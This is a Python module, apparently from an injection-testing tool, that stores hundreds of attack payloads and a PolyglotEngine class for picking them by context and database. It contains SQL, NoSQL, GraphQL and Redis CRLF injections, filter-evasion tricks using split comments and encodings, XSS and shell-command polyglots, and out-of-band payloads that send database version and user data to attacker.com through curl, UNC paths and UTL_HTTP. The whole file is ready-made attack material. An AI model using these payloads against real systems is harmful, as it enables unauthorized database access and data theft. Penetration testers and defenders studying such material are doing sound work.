"""
Polyglot SQL Injection Payloads

Collection of polyglot payloads that work across multiple contexts, databases,
and injection points. These payloads are designed to bypass complex filters
and work in various scenarios simultaneously.
"""

from typing import Dict, List


class PolyglotPayloads:
    """Advanced polyglot SQL injection payloads"""
    
    # Universal polyglot payloads that work across multiple databases
    UNIVERSAL_POLYGLOTS = [
        # RLIKE-based polyglot (works in MySQL, PostgreSQL with extensions)
        "RLIKE (SELECT (CASE WHEN (1=1) THEN 1 ELSE 0x28 END)) --",
        
        # JSON-based polyglot
        "' OR '1'='1' --  {\"test\":\"value\"} <!--",
        
        # XML/HTML comment polyglot
        "' OR '1'='1' /* <!-- --> <test>",
        
        # Multi-database version detection polyglot
        "' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE (SELECT 1 UNION SELECT 2) END)='a' --",
        
        # Bitwise operation polyglot
        "' OR 1=1&1 --",
        "' OR 1=1|1 --",
        "' OR 1=1^0 --",
        
        # Mathematical polyglot
        "' OR '1'='1' AND 1=1 OR '1'='1",
        "' OR 1=1 AND POWER(1,1)=1 --",
        
        # Concatenation polyglot (works across DB types)
        "' OR 'x'='x' AND 'a'||'b'='ab' AND 'c'+'d'='cd' --",
        
        # Time-based polyglot
        "' OR IF(1=1,SLEEP(0),BENCHMARK(0,MD5('A'))) --",
        
        # Stacked query polyglot
        "'; SELECT CASE WHEN 1=1 THEN pg_sleep(0) END; --",
        
        # Error-based polyglot
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version))) --",
        
        # Boolean-based with multiple escape sequences
        "' AND '1'='1' -- -",
        "' AND '1'='1' #",
        "' AND '1'='1' /*",
    ]
    
    # Context-agnostic payloads (work in various injection points)
    CONTEXT_AGNOSTIC = [
        # String context polyglot
        "test' OR 'a'='a",
        'test" OR "a"="a',
        "test' OR '1'='1' OR 'a'='a",
        'test" OR "1"="1" OR "a"="a',
        
        # Numeric context polyglot
        "1 OR 1=1",
        "1) OR 1=1 --",
        "1)) OR 1=1 --",
        "1 AND 1=1",
        
        # Mixed quote polyglot
        "' OR '1'='1' OR \"1\"=\"1\" --",
        
        # Array/JSON injection polyglot
        "1' AND '1'='1' AND '1'='1",
        '1" AND "1"="1" AND "1"="1',
        
        # URL parameter polyglot
        "1%27%20OR%20%271%27=%271",
        
        # XML attribute polyglot
        "' OR '1'='1' OR ''='",
        '" OR "1"="1" OR ""="',
        
        # Cookie value polyglot
        "admin' --",
        'admin" --',
        
        # Header value polyglot
        "' OR 1=1 --",
        '" OR 1=1 --',
    ]
    
    # Advanced multi-layer polyglots
    MULTI_LAYER_POLYGLOTS = [
        # PHP + SQL polyglot
        "<?php echo 'test'; ?>' OR '1'='1' --",
        
        # JavaScript + SQL polyglot
        "<script>alert(1)</script>' OR '1'='1' --",
        
        # HTML + SQL polyglot  
        "<img src=x onerror=alert(1)>' OR '1'='1' --",
        
        # JSON + SQL polyglot
        '{"test":"value\' OR \'1\'=\'1\' --"}',
        
        # XML + SQL polyglot
        '<test value="\' OR \'1\'=\'1\' --"/>',
        
        # Base64 + SQL polyglot (needs decoding on server)
        "JyBPUiAnMSc9JzEn",  # ' OR '1'='1
        
        # Command injection + SQL polyglot
        "'; ls -la; SELECT '1",
        
        # LDAP + SQL polyglot
        "*)(|(objectClass=*)' OR '1'='1",
    ]
    
    # Database-specific advanced polyglots
    DB_SPECIFIC_POLYGLOTS = {
        'mysql': [
            # MySQL version comment polyglot
            "/*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --",
            
            # MySQL hex polyglot
            "' OR 0x31=0x31 --",
            
            # MySQL function polyglot
            "' OR MID(@@version,1,1)=MID(@@version,1,1) --",
            
            # MySQL information_schema polyglot
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) --",
            
            # MySQL boolean polyglot with encoding
            "' OR '\\x31'='\\x31' --",
        ],
        'postgresql': [
            # PostgreSQL array polyglot
            "' OR 1=ANY(ARRAY[1,2,3]) --",
            
            # PostgreSQL cast polyglot
            "' OR 1::int=1::int --",
            
            # PostgreSQL string polyglot
            "' OR 'a'||'b'='ab' --",
            
            # PostgreSQL regex polyglot
            "' OR 'test' ~ 'test' --",
            
            # PostgreSQL version polyglot
            "' AND CAST(version() AS TEXT) LIKE '%PostgreSQL%' --",
        ],
        'mssql': [
            # MSSQL concatenation polyglot
            "' OR 'a'+'b'='ab' --",
            
            # MSSQL cast polyglot
            "' OR CAST(1 AS VARCHAR)=CAST(1 AS VARCHAR) --",
            
            # MSSQL system function polyglot
            "' OR @@SERVERNAME=@@SERVERNAME --",
            
            # MSSQL error-based polyglot
            "' OR 1=CONVERT(INT,(SELECT @@version)) --",
            
            # MSSQL time-based polyglot
            "'; IF 1=1 WAITFOR DELAY '00:00:00' --",
        ],
        'oracle': [
            # Oracle dual polyglot
            "' OR 'a'=(SELECT 'a' FROM dual) --",
            
            # Oracle concatenation polyglot
            "' OR 'a'||'b'='ab' --",
            
            # Oracle ROWNUM polyglot
            "' AND ROWNUM=1 --",
            
            # Oracle version polyglot
            "' AND (SELECT banner FROM v$version WHERE ROWNUM=1) LIKE '%Oracle%' --",
            
            # Oracle UTL polyglot
            "' OR UTL_INADDR.GET_HOST_NAME('127.0.0.1') IS NOT NULL --",
        ],
        'sqlite': [
            # SQLite version polyglot
            "' OR sqlite_version()=sqlite_version() --",
            
            # SQLite GLOB polyglot
            "' OR 'test' GLOB 'test' --",
            
            # SQLite LIKE polyglot
            "' OR 'a' LIKE 'a' --",
            
            # SQLite length polyglot
            "' OR length('a')=1 --",
        ],
    }
    
    # Parameter pollution polyglots
    PARAMETER_POLLUTION = [
        # HPP (HTTP Parameter Pollution)
        "1&id=2' OR '1'='1",
        "1%26id=2' OR '1'='1",
        
        # JSON parameter pollution
        '{"id":"1","id":"2\' OR \'1\'=\'1\'"}',
        
        # Array parameter pollution
        "id[]=1&id[]=2' OR '1'='1",
        
        # Nested parameter pollution
        "id[name][0]=1' OR '1'='1",
    ]
    
    # JSON injection polyglots
    JSON_INJECTION = [
        # JSON SQL injection
        '{"user":"admin\' OR \'1\'=\'1\'--"}',
        '{"query":"SELECT * FROM users WHERE id=1\' OR \'1\'=\'1\'--"}',
        
        # JSON NoSQL injection (MongoDB)
        '{"$where":"this.id==1 || true"}',
        '{"$gt":""}',
        '{"$ne":""}',
        
        # JSON path injection
        '{"user":"$.admin\' OR \'1\'=\'1\'--"}',
        
        # JSON array injection
        '["admin","OR","1=1","--"]',
    ]
    
    # NoSQL injection polyglots
    NOSQL_INJECTION = [
        # MongoDB operator injection
        "admin' || '1'=='1",
        '{"$where":"1==1"}',
        '{"$gt":""}',
        '{"$ne":null}',
        '{"$regex":".*"}',
        '{"$exists":true}',
        '{"$gte":""}',
        # MongoDB aggregation injection
        '{"$or":[{"password":{"$exists":true}}]}',
        '{"$where":"function() { return true; }"}',
        # URL-encoded MongoDB operator injection
        "username[$ne]=null&password[$ne]=null",
        "username[$gt]=&password[$gt]=",
        "username[$regex]=.*&password[$regex]=.*",
        # CouchDB injection
        '{"selector":{"_id":{"$gt":null}}}',
        '{"selector":{"password":{"$regex":".*"}}}',
        # Redis CRLF injection
        "*\r\n$4\r\nKEYS\r\n$1\r\n*\r\n",
        "\r\nSET mykey malicious\r\n",
        "%0d%0aSET%20mykey%20malicious%0d%0a",
        # Neo4j Cypher injection
        "' OR 1=1 WITH 1 as a MATCH (n) RETURN n//",
        "' UNION MATCH (u:User) RETURN u.password//",
    ]
    
    # GraphQL injection polyglots
    GRAPHQL_INJECTION = [
        # GraphQL query injection
        "query{users(where:{id:{_eq:1}OR:{id:{_eq:1}})}",
        # GraphQL variable injection
        '{"id": "1\' OR \'1\'=\'1\'--"}',
        '{"id": "1\' AND SLEEP(5)--"}',
        '{"username": "admin\'--"}',
        # GraphQL mutation injection
        'mutation{updateUser(id:1,data:{name:"admin\' OR \'1\'=\'1\'--"})}',
        'mutation{login(username:"admin\'--",password:"x")}',
        # GraphQL introspection
        "{__schema{types{name}}}",
        "{__type(name:\"User\"){fields{name}}}",
        # Batching attack
        '[{"query":"{user(id:\\"1\' OR \\'1\\'=\\'1\\'")}"}]',
        # Fragment injection
        "fragment sqli on User { password(where: {id: {_eq: \"1' UNION SELECT password FROM admin--\"}}) }",
    ]
    
    # Time-based polyglots with various delays
    TIME_BASED_POLYGLOTS = [
        # Universal time-based
        "' OR IF(1=1,SLEEP(5),0) OR '1'='1' --",
        "' OR CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END --",
        "'; IF 1=1 WAITFOR DELAY '00:00:05' --",
        "' OR DBMS_LOCK.SLEEP(5) --",
        
        # Conditional time-based
        "' OR (SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END) --",
        
        # Benchmark-based (MySQL)
        "' OR BENCHMARK(10000000,MD5('test')) --",
        
        # Heavy query-based
        "' OR (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B) --",
    ]
    
    # OOB (Out-of-Band) polyglots
    OOB_POLYGLOTS = [
        # DNS exfiltration polyglots
        "' OR LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.attacker.com\\\\a')) --",
        "'; EXEC master..xp_dirtree '\\\\\\\\'+@@version+'.attacker.com\\\\a' --",
        "' OR UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.attacker.com') IS NOT NULL --",
        
        # HTTP exfiltration polyglots
        "'; COPY (SELECT version()) TO PROGRAM 'curl http://attacker.com/?data='||version() --",
    ]
    
    # Polyglots for different encoding contexts
    ENCODING_POLYGLOTS = {
        'url_encoded': [
            "%27%20OR%20%271%27%3D%271",
            "%27%20UNION%20SELECT%20NULL--",
        ],
        'double_url_encoded': [
            "%2527%2520OR%2520%25271%2527%253D%25271",
        ],
        'unicode': [
            "\\u0027 OR \\u0031=\\u0031 --",
        ],
        'hex': [
            "0x27204f522031 3d31202d2d",
        ],
        'base64': [
            "JyBPUiAnMSc9JzEn",  # ' OR '1'='1
        ],
    }
    
    # Chunked/inline comment polyglots
    CHUNKED_POLYGLOTS = [
        # MySQL chunked
        "' UNI/**/ON SEL/**/ECT 1,2,3 --",
        "' UN/**/ION SE/**/LECT 1,2,3 --",
        "' /**/OR/**/ '1'='1' --",
        
        # Version comment chunked
        "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 --",
        "' /*!12345UNION*/ /*!12345SELECT*/ 1,2,3 --",
        
        # Case mixing with chunks
        "' uNIoN sELeCt 1,2,3 --",
        "' Un/**/Ion Se/**/Lect 1,2,3 --",
        
        # Multiple comment types
        "' UNION-- \n SELECT# \n1,2,3 --",
        "' UNION/*comment*/SELECT/*another*/1,2,3 --",
    ]


class PolyglotEngine:
    """Engine for generating and managing polyglot payloads"""
    
    def __init__(self):
        self.payloads = PolyglotPayloads()
    
    def get_universal_polyglots(self) -> List[str]:
        """Get universal polyglot payloads"""
        return self.payloads.UNIVERSAL_POLYGLOTS.copy()
    
    def get_context_agnostic(self) -> List[str]:
        """Get context-agnostic payloads"""
        return self.payloads.CONTEXT_AGNOSTIC.copy()
    
    def get_db_specific_polyglots(self, db_type: str) -> List[str]:
        """Get database-specific polyglot payloads"""
        return self.payloads.DB_SPECIFIC_POLYGLOTS.get(db_type, []).copy()
    
    def get_json_injection_payloads(self) -> List[str]:
        """Get JSON injection polyglot payloads"""
        return self.payloads.JSON_INJECTION.copy()
    
    def get_nosql_injection_payloads(self) -> List[str]:
        """Get NoSQL injection polyglot payloads"""
        return self.payloads.NOSQL_INJECTION.copy()
    
    def get_time_based_polyglots(self) -> List[str]:
        """Get time-based polyglot payloads"""
        return self.payloads.TIME_BASED_POLYGLOTS.copy()
    
    def get_oob_polyglots(self) -> List[str]:
        """Get OOB polyglot payloads"""
        return self.payloads.OOB_POLYGLOTS.copy()
    
    def get_all_polyglots(self) -> List[str]:
        """Get all polyglot payloads"""
        all_payloads = []
        all_payloads.extend(self.payloads.UNIVERSAL_POLYGLOTS)
        all_payloads.extend(self.payloads.CONTEXT_AGNOSTIC)
        all_payloads.extend(self.payloads.MULTI_LAYER_POLYGLOTS)
        
        # Add DB-specific
        for db_payloads in self.payloads.DB_SPECIFIC_POLYGLOTS.values():
            all_payloads.extend(db_payloads)
        
        all_payloads.extend(self.payloads.PARAMETER_POLLUTION)
        all_payloads.extend(self.payloads.JSON_INJECTION)
        all_payloads.extend(self.payloads.NOSQL_INJECTION)
        all_payloads.extend(self.payloads.TIME_BASED_POLYGLOTS)
        all_payloads.extend(self.payloads.OOB_POLYGLOTS)
        all_payloads.extend(self.payloads.CHUNKED_POLYGLOTS)
        
        return all_payloads
    
    def get_smart_polyglots(self, context: str = 'unknown', db_type: str = 'unknown') -> List[str]:
        """
        Get smart selection of polyglots based on context and database type
        
        Args:
            context: Injection context (string, numeric, json, etc.)
            db_type: Database type (mysql, postgresql, mssql, oracle, sqlite)
        
        Returns:
            List of relevant polyglot payloads
        """
        payloads = []
        
        # Always include universal polyglots
        payloads.extend(self.payloads.UNIVERSAL_POLYGLOTS[:5])
        
        # Add context-specific payloads
        if context == 'json':
            payloads.extend(self.payloads.JSON_INJECTION)
            payloads.extend(self.payloads.NOSQL_INJECTION)
        elif context == 'graphql':
            payloads.extend(self.payloads.GRAPHQL_INJECTION)
        elif context in ['string', 'numeric']:
            payloads.extend(self.payloads.CONTEXT_AGNOSTIC[:10])
        else:
            # Unknown context - use context-agnostic
            payloads.extend(self.payloads.CONTEXT_AGNOSTIC)
        
        # Add DB-specific payloads if known
        if db_type in self.payloads.DB_SPECIFIC_POLYGLOTS:
            payloads.extend(self.payloads.DB_SPECIFIC_POLYGLOTS[db_type])
        
        # Add time-based and chunked for completeness
        payloads.extend(self.payloads.TIME_BASED_POLYGLOTS[:3])
        payloads.extend(self.payloads.CHUNKED_POLYGLOTS[:3])
        
        return payloads
